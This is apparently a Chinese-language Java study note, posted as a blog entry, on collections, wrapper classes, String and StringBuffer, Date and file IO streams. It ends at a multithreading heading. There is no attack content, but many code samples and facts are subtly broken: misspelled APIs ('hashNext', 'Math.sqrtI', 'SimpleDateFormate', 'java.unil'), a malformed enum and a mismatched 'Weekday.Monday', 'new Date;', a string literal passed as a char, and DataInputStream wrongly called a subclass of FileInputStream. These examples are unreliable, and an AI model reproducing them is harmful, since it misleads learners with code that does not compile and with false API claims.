        <content type="html"><![CDATA[<h1 id="Java内置API"><a href="#Java内置API" class="headerlink" title="Java内置API"></a>Java内置API</h1><br/><h2 id="集合框架"><a href="#集合框架" class="headerlink" title="集合框架"></a>集合框架</h2><p>集合框架是一种保存数据的容器，它与数组的区别在于集合框架的大小可以动态变化</p><p>Java集合框架提供了一套性能优良且方便使用的接口和类，位于<code>java.unil</code>包中</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">Collection（接口）</span><br><span class="line">├── List（接口）- 有序、可重复、有索引</span><br><span class="line">│   ├── ArrayList（类）- 数组实现，查询快，增删慢</span><br><span class="line">│   ├── LinkedList（类）- 链表实现，增删快，查询慢</span><br><span class="line">│   └── Vector（类）- 线程安全，已过时</span><br><span class="line">│       └── Stack（类）- 栈结构</span><br><span class="line">│</span><br><span class="line">├── Set（接口）- 无序、唯一（不重复）</span><br><span class="line">│   ├── HashSet（类）- 哈希表实现，无序</span><br><span class="line">│   │   └── LinkedHashSet（类）- 链表维护插入顺序</span><br><span class="line">│   └── SortedSet（接口）- 有序Set</span><br><span class="line">│       └── TreeSet（类）- 红黑树实现，自然排序</span><br><span class="line">│</span><br><span class="line">└── Queue（接口）- 队列</span><br><span class="line">    ├── Deque（接口）- 双端队列</span><br><span class="line">    │   ├── ArrayDeque（类）- 数组实现双端队列</span><br><span class="line">    │   └── LinkedList（类）- 也实现了Deque</span><br><span class="line">    ├── PriorityQueue（类）- 优先级队列</span><br><span class="line">    └── BlockingQueue（接口）- 阻塞队列（JUC）</span><br><span class="line">        ├── ArrayBlockingQueue（类）</span><br><span class="line">        ├── LinkedBlockingQueue（类）</span><br><span class="line">        └── PriorityBlockingQueue（类）</span><br><span class="line"></span><br><span class="line">Map（接口）- 键值对，独立于Collection</span><br><span class="line">├── HashMap（类）- 哈希表实现</span><br><span class="line">│   └── LinkedHashMap（类）- 链表维护插入顺序</span><br><span class="line">├── Hashtable（类）- 线程安全，已过时</span><br><span class="line">├── SortedMap（接口）- 有序Map</span><br><span class="line">│   └── TreeMap（类）- 红黑树实现</span><br><span class="line">└── ConcurrentMap（接口）- 并发Map（JUC）</span><br><span class="line">    ├── ConcurrentHashMap（类）</span><br><span class="line">    └── ConcurrentSkipListMap（类）</span><br></pre></td></tr></table></figure><blockquote><p>Collection接口存储一组不唯一，无序的对象</p><p>List接口存储一组不唯一，有序的对象</p><p>Set接口存储一组唯一，无序的对象</p><p>Map接口存储一组键值对象，提供了key到value的映射 </p></blockquote><p>ArrayList实现了长度可变的数组，在内存中连续分配空间，遍历元素和随机访问的效率较高</p><p>LinkedList采用链表的存储方式，插入删除时的效率较高</p><h3 id="ArrayList"><a href="#ArrayList" class="headerlink" title="ArrayList"></a>ArrayList</h3><p>添加数据：<code>add(Object obj)</code></p><p>插入数据：<code>add(int index,Object obj)</code></p><p>删除数据：<code>remove(Object obj)</code></p><p>删除指定位置元素：<code>remove(int index)</code></p><p>判断是否存在指定元素：<code>contains(Object obj)</code></p><h3 id="LinkedList"><a href="#LinkedList" class="headerlink" title="LinkedList"></a>LinkedList</h3><blockquote><p>LinkList提供对头部和尾部元素进行操作的方法</p></blockquote><p>在列表头部添加元素：<code>addFirst(Object obj)</code></p><p>在列表末尾添加元素：<code>addLast(Object obj)</code></p><p>返回列表的第一个元素：<code>getFirst()</code></p><p>返回列表的最后一个元素：<code>getLast()</code></p><p>删除并返回列表的第一个元素：<code>removeFirst()</code></p><p>删除并返回列表的最后一个元素：<code>removeLast()</code></p><h3 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h3><p>具有Set接口的所有方法，Set存储的是对象的引用，也就是唯一的对象</p><h3 id="HashMap"><a href="#HashMap" class="headerlink" title="HashMap"></a>HashMap</h3><p>HashMap属于双列集合，既要提供key也要提供value </p><p>添加数据：<code>put(key,value)</code></p><p>根据键获取值：<code>get(key)</code></p><p>获取所有键的集合：<code>keySet()</code></p><p>获取所有值的集合：<code>values()</code></p><p>获取所有键值对的集合：<code>entrySet()</code></p><p>检测是否包含某个键：<code>containsKey(key)</code></p><h3 id="迭代器-Iterator"><a href="#迭代器-Iterator" class="headerlink" title="迭代器(Iterator)"></a>迭代器(Iterator)</h3><p>迭代器是一个接口</p><blockquote><p>如何获取一个迭代器的实现类？我们可以通过一个对象的方法创建对象，如通过<code>Iterator iterator = set.iterator</code>创建一个迭代器的实现类</p></blockquote><p>检测是否具有下一个数据：<code>hashNext()</code></p><p>获取下一个数据：<code>next()</code> </p><h3 id="泛型集合"><a href="#泛型集合" class="headerlink" title="泛型集合"></a>泛型集合</h3><p>泛型集合限制了集合元素的类型</p><p><code>List&lt;Book&gt; list = new ArrayList&lt;Book&gt;();</code>此时的<code>list</code>集合内便只能存储<code>Book</code>类型的数据</p> <br/><h2 id="实用类"><a href="#实用类" class="headerlink" title="实用类"></a>实用类</h2><h3 id="枚举"><a href="#枚举" class="headerlink" title="枚举"></a>枚举</h3><p><code>枚举(enum)</code>指一组固定的常量组成的类型，当某种类型只能取固定范围内的值时，可以定义为枚举类型，如</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">Weekday</span> &#123;&#125;</span><br><span class="line">    MONDAY,TUESDAY,WENESDAY,THURSDAY,FRIDAY,SATURDAY,SUNDAY</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>引用枚举类型</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Weekday</span> <span class="variable">day</span> <span class="operator">=</span> Weekday.Monday;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="包装类"><a href="#包装类" class="headerlink" title="包装类"></a>包装类</h3><p>包装类把基本数据类型转换为对象，并提供了一系列方法</p><table><thead><tr><th>基本数据类型</th><th>包装类</th></tr></thead><tbody><tr><td><code>byte</code></td><td><code>Byte</code></td></tr><tr><td><code>short</code></td><td><code>Short</code></td></tr><tr><td><code>int</code></td><td><code>Integer</code></td></tr><tr><td><code>long</code></td><td><code>Long</code></td></tr><tr><td><code>float</code></td><td><code>Float</code></td></tr><tr><td><code>double</code></td><td><code>Double</code></td></tr><tr><td><code>boolean</code></td><td><code>Boolean</code></td></tr><tr><td><code>char</code></td><td><code>Character</code></td></tr></tbody></table><p>包装类可以有构造，并使用构造赋值（手动装箱）</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Integer</span> <span class="variable">num</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Integer</span>(<span class="number">1</span>);</span><br><span class="line"><span class="type">Double</span> <span class="variable">num2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Double</span>(<span class="number">1.2</span>);</span><br><span class="line"><span class="type">Character</span> <span class="variable">ch</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Characer</span>(<span class="string">&#x27;hello&#x27;</span>);</span><br><span class="line"><span class="type">Boolean</span> <span class="variable">bool</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Boolean</span>(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>基本类型可以自动转化为包装类，如<code>Integer num = 1;</code>（自动装箱）</p><p>包装类转化为基本类型，直接取值，如<code>int num1 = num.intValue;</code>（手动拆箱）</p><h3 id="装箱和拆箱"><a href="#装箱和拆箱" class="headerlink" title="装箱和拆箱"></a>装箱和拆箱</h3><p>装箱：基本类型转化为包装类型对象</p><p>拆箱：包装类型对象转化为基本类型的值</p><blockquote><p>自动拆箱的例子<code>int num1 = num;</code>这里的<code>num</code>是一个<code>Integer</code>包装类的对象</p></blockquote><blockquote><p>装箱操作存在的必要性：泛型集合中不能容纳基本类型数据</p></blockquote><h3 id="Math类"><a href="#Math类" class="headerlink" title="Math类"></a><code>Math</code>类</h3><p><code>Math.abs()</code>用于获得绝对值</p><p><code>Math.max()</code>用于求最大值</p><p><code>Math.pow()</code>用于进行次方运算</p><p><code>Math.sqrtI()</code>用于进行开方运算</p><blockquote><p>这些方法都是静态方法，不需要对<code>Math</code>类进行实例化  </p></blockquote><h3 id="String和StringBuffer"><a href="#String和StringBuffer" class="headerlink" title="String和StringBuffer"></a><code>String</code>和<code>StringBuffer</code></h3><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><p>常用方法</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td><code>length()</code></td><td>获取字符串长度</td></tr><tr><td><code>equals(Object boj)</code></td><td>比较字符串内容是否一致</td></tr><tr><td><code>equalsIgnoreCase(String str)</code></td><td>忽略大小写对比</td></tr><tr><td><code>toLowerCase()</code></td><td>转小写</td></tr><tr><td><code>toUpperCase()</code></td><td>转大写</td></tr><tr><td><code>concat(String str)</code></td><td>连接字符串</td></tr><tr><td><code>indexOf(String value)</code></td><td>搜索第一个出现的字符串<code>value</code>，有则返回索引，没有找到则返回<code>-1</code></td></tr><tr><td><code>lastIndexOf(String value)</code></td><td>搜索最后一个出现的字符串<code>value</code>，有则返回索引，没有找到则返回<code>-1</code></td></tr><tr><td><code>substring(int index)</code></td><td>提取从位置索引开始的字符串部分</td></tr><tr><td><code>substring(int beginindex,int endindex)</code></td><td>提取<code>beginindex</code>和<code>endindex</code>之间的字符串部分</td></tr><tr><td><code>trim()</code></td><td>返回一个前后不含任何空格的调用字符串的副本</td></tr><tr><td><code>replace(char oldChar,char newChar)</code></td><td>将<code>oldChar</code>替换为<code>newChar</code></td></tr><tr><td><code>replace(CharSequence target,CharSequence replacement)</code></td><td>将<code>target</code>替换为<code>replacement</code></td></tr><tr><td><code>split(String regex)</code></td><td>将第一个字符串分割为子字符处女，结果作为字符串数组返回</td></tr></tbody></table><h4 id="StringBuffer"><a href="#StringBuffer" class="headerlink" title="StringBuffer"></a>StringBuffer</h4><p><code>StringBuffer</code>是可变字符串。需要对字符串进行大量拼接时，使用<code>StringBuffer</code>类可以提高执行效率</p><p>常用方法</p><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td><code>append(Striing str)</code></td><td>追加字符串</td></tr><tr><td><code>insert(int index)</code></td><td>插入字符串</td></tr></tbody></table><blockquote><p>输出<code>StringBuffer</code>需要先使用<code>toString</code>方法转换</p></blockquote><h3 id="随机数"><a href="#随机数" class="headerlink" title="随机数"></a>随机数</h3><p>使用<code>Random</code>类可以生伪随机数，位于<code>java.util</code>包下</p><p>使用<code>Random random = new Random();</code>实例化<code>Random</code>类，可以在构造方法中传入任意数字作为<code>seed</code></p><h3 id="获取日期和时间"><a href="#获取日期和时间" class="headerlink" title="获取日期和时间"></a>获取日期和时间</h3><p>使用<code>Date</code>类获得有关时间的数据，位于<code>java.util</code>包下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Date</span> <span class="variable">date</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Date</span>;</span><br><span class="line"><span class="comment">//设置输出格式</span></span><br><span class="line"><span class="type">SimpleDateFormate</span> <span class="variable">formater</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleDateFormate</span>(<span class="string">&quot;yyyy-MM-dd&quot;</span>)</span><br><span class="line"><span class="type">String</span> <span class="variable">result</span> <span class="operator">=</span> formater.format(date);</span><br><span class="line">System.out.println(result);</span><br><span class="line">System.out.println(date.toString());</span><br></pre></td></tr></table></figure>  <br/><h2 id="IO流"><a href="#IO流" class="headerlink" title="IO流"></a>IO流</h2><h3 id="File类访问文件及目录"><a href="#File类访问文件及目录" class="headerlink" title="File类访问文件及目录"></a>File类访问文件及目录</h3><p>使用<code>java.io.file</code>包下的<code>File</code>类</p><table><thead><tr><th align="left">方法</th><th align="left">说明</th></tr></thead><tbody><tr><td align="left"><code>boolean exists()</code></td><td align="left">判断文件或目录是否存在</td></tr><tr><td align="left"><code>boolean isFile()</code></td><td align="left">判断是否是文件</td></tr><tr><td align="left"><code>boolean isDirectory()</code></td><td align="left">判断是否是目录</td></tr><tr><td align="left"><code>String getPath()</code></td><td align="left">返回此对象表示的文件的相对路径名</td></tr><tr><td align="left"><code>String getAbsolutePath()</code></td><td align="left">返回此对象表示的文件的绝对路径名</td></tr><tr><td align="left"><code>String getName()</code></td><td align="left">返回此对象表示的文件或目录的名称</td></tr><tr><td align="left"><code>boolean delete()</code></td><td align="left">删除此对象指定的文件或目录</td></tr><tr><td align="left"><code>boolean createNewFile()</code></td><td align="left">创建名称的空文件，不创建文件夹</td></tr><tr><td align="left"><code>long length()</code></td><td align="left">返回文件的长度，单位为字节，如果文件不存在，则返回0L</td></tr></tbody></table><h3 id="字节流"><a href="#字节流" class="headerlink" title="字节流"></a>字节流</h3><p> <code>FileInputStream</code>,继承于<code>InputStream</code></p><p><code>int read()</code>返回下一个字节<br><code>int read(byte[] b)</code>返回缓冲区数据总量<br><code>int read(byte[] b,int off,int len)</code>从输入流中读取最多 len 个字节的数据到字节数组 b 中，从数组的偏移位置 off 开始存储<br><code>void close()</code>关闭流<br><code>int available()</code> 可以从输入流中读取的字节数目</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileReader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 创建文件输入流</span></span><br><span class="line">            fis = <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 逐个字节读取并显示</span></span><br><span class="line">            <span class="type">int</span> byteData;</span><br><span class="line">            System.out.println(<span class="string">&quot;文件内容（字节形式）：&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> ((byteData = fis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 将字节转换为字符显示</span></span><br><span class="line">                System.out.print((<span class="type">char</span>) byteData);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;读取文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 关闭流</span></span><br><span class="line">            <span class="keyword">if</span> (fis != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fis.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;关闭文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FileOutputStream</code>可用于写入文件，继承于<code>OutputStream</code><br><code>void write(int c)</code>写入整数<br><code>void write(byte[] buf)</code>写入字节数组<br><code>void write(byte[] b,int off,int len)</code>向输入流中写入最多 len 个字节的数据到字节数组 b 中，从数组的偏移位置 off 开始存储<br><code>void close()</code>关闭流</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileWriter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 创建文件输出流</span></span><br><span class="line">            <span class="comment">// 如果文件不存在会自动创建，如果存在会覆盖</span></span><br><span class="line">            fos = <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 写入字符串（需要转换为字节）</span></span><br><span class="line">            <span class="type">String</span> <span class="variable">text</span> <span class="operator">=</span> <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">            <span class="type">byte</span>[] bytes = text.getBytes();  <span class="comment">// 字符串转字节数组</span></span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 3. 写入文件</span></span><br><span class="line">            fos.write(bytes);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;文件写入成功！&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;写入文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 4. 关闭流</span></span><br><span class="line">            <span class="keyword">if</span> (fos != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    fos.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;关闭文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="字符流"><a href="#字符流" class="headerlink" title="字符流"></a>字符流</h3><p>字符流以字符为单位进行读取写入操作，基本逻辑与字节流无异 </p><p><code>FileReader</code>的父类是<code>InputStreamReader</code>，<code>InputStreamReader</code>的父类是<code>Reader</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileReader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 创建FileReader</span></span><br><span class="line">            reader = <span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;test.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 逐个字符读取</span></span><br><span class="line">            <span class="type">int</span> charData;</span><br><span class="line">            System.out.println(<span class="string">&quot;文件内容：&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> ((charData = reader.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                System.out.print((<span class="type">char</span>) charData);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;读取文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 关闭流</span></span><br><span class="line">            <span class="keyword">if</span> (reader != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    reader.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;关闭文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>FileWriter</code>的父类是<code>OutputStreamWriter</code>，<code>OutputStreamWriter</code>的父类是<code>Writer</code></p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleFileWriter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">FileWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 1. 创建FileWriter</span></span><br><span class="line">            <span class="comment">// 默认覆盖模式，文件不存在会自动创建</span></span><br><span class="line">            writer = <span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 2. 写入内容</span></span><br><span class="line">            writer.write(<span class="string">&quot;你好，世界！\n&quot;</span>);</span><br><span class="line">            writer.write(<span class="string">&quot;Hello, World!\n&quot;</span>);</span><br><span class="line">            writer.write(<span class="string">&quot;这是第三行。\n&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;文件写入成功！&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;写入文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 3. 关闭流</span></span><br><span class="line">            <span class="keyword">if</span> (writer != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    System.out.println(<span class="string">&quot;关闭文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="缓冲流"><a href="#缓冲流" class="headerlink" title="缓冲流"></a>缓冲流</h3><p>使用<code>BufferedReader</code>读取文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.FileReader;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleBufferedReader</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">FileReader</span>(<span class="string">&quot;test.txt&quot;</span>))) &#123;</span><br><span class="line">            </span><br><span class="line">            String line;</span><br><span class="line">            <span class="type">int</span> <span class="variable">lineNumber</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;文件内容：&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 逐行读取，直到文件结束</span></span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                System.out.println(lineNumber + <span class="string">&quot;: &quot;</span> + line);</span><br><span class="line">                lineNumber++;</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;总共 &quot;</span> + (lineNumber - <span class="number">1</span>) + <span class="string">&quot; 行&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;读取文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用<code>BufferedWriter</code>写入文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.BufferedWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.FileWriter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SimpleBufferedWriter</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> (<span class="type">BufferedWriter</span> <span class="variable">writer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedWriter</span>(<span class="keyword">new</span> <span class="title class_">FileWriter</span>(<span class="string">&quot;output.txt&quot;</span>))) &#123;</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 写入内容</span></span><br><span class="line">            writer.write(<span class="string">&quot;你好，世界！&quot;</span>);</span><br><span class="line">            writer.newLine();  <span class="comment">// 换行</span></span><br><span class="line">            writer.write(<span class="string">&quot;Hello, World!&quot;</span>);</span><br><span class="line">            writer.newLine();</span><br><span class="line">            writer.write(<span class="string">&quot;这是第三行。&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;文件写入成功！&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;写入文件出错: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="读写二进制文件"><a href="#读写二进制文件" class="headerlink" title="读写二进制文件"></a>读写二进制文件</h3><p>上面说的集几种流只能操作文本，使用二进制流可以让我们实现对更多文件的读写</p><p><code>DataInputStream</code>类，是<code>FileInputStream</code>的子类，与<code>FileInputStream</code>类结合使用读取二进制文件</p><p><code>DataOutputStream</code>类，是<code>FileOutputStream</code>的子类，与<code>FileOutputStream</code>类结合使用写二进制文件</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BinaryFileCopy</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">DataInputStream</span> <span class="variable">dis</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">DataOutputStream</span> <span class="variable">dos</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// 源文件（二进制文件，如图片）</span></span><br><span class="line">            <span class="type">FileInputStream</span> <span class="variable">fis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;C:\\Java\\读书\\1.png&quot;</span>);</span><br><span class="line">            <span class="comment">// 目标文件</span></span><br><span class="line">            <span class="type">FileOutputStream</span> <span class="variable">fos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;C:\\Java\\读书\\2.png&quot;</span>);</span><br><span class="line">            </span><br><span class="line">            dis = <span class="keyword">new</span> <span class="title class_">DataInputStream</span>(fis);</span><br><span class="line">            dos = <span class="keyword">new</span> <span class="title class_">DataOutputStream</span>(fos);</span><br><span class="line">            </span><br><span class="line">            <span class="comment">// 边读取数据，边写入数据</span></span><br><span class="line">            <span class="type">int</span> data; <span class="comment">// 存储读取的字节（0-255）或-1（文件结束）</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">while</span> ((data = dis.read()) != -<span class="number">1</span>) &#123;</span><br><span class="line">                <span class="comment">// 写入读取的字节</span></span><br><span class="line">                dos.write(data);</span><br><span class="line">            &#125;</span><br><span class="line">            </span><br><span class="line">            System.out.println(<span class="string">&quot;文件复制完成！&quot;</span>);</span><br><span class="line">            </span><br><span class="line">        &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;文件未找到: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;IO错误: &quot;</span> + e.getMessage());</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="comment">// 关闭流（实际代码中应该在这里）</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>  <br/><h2 id="多线程"><a 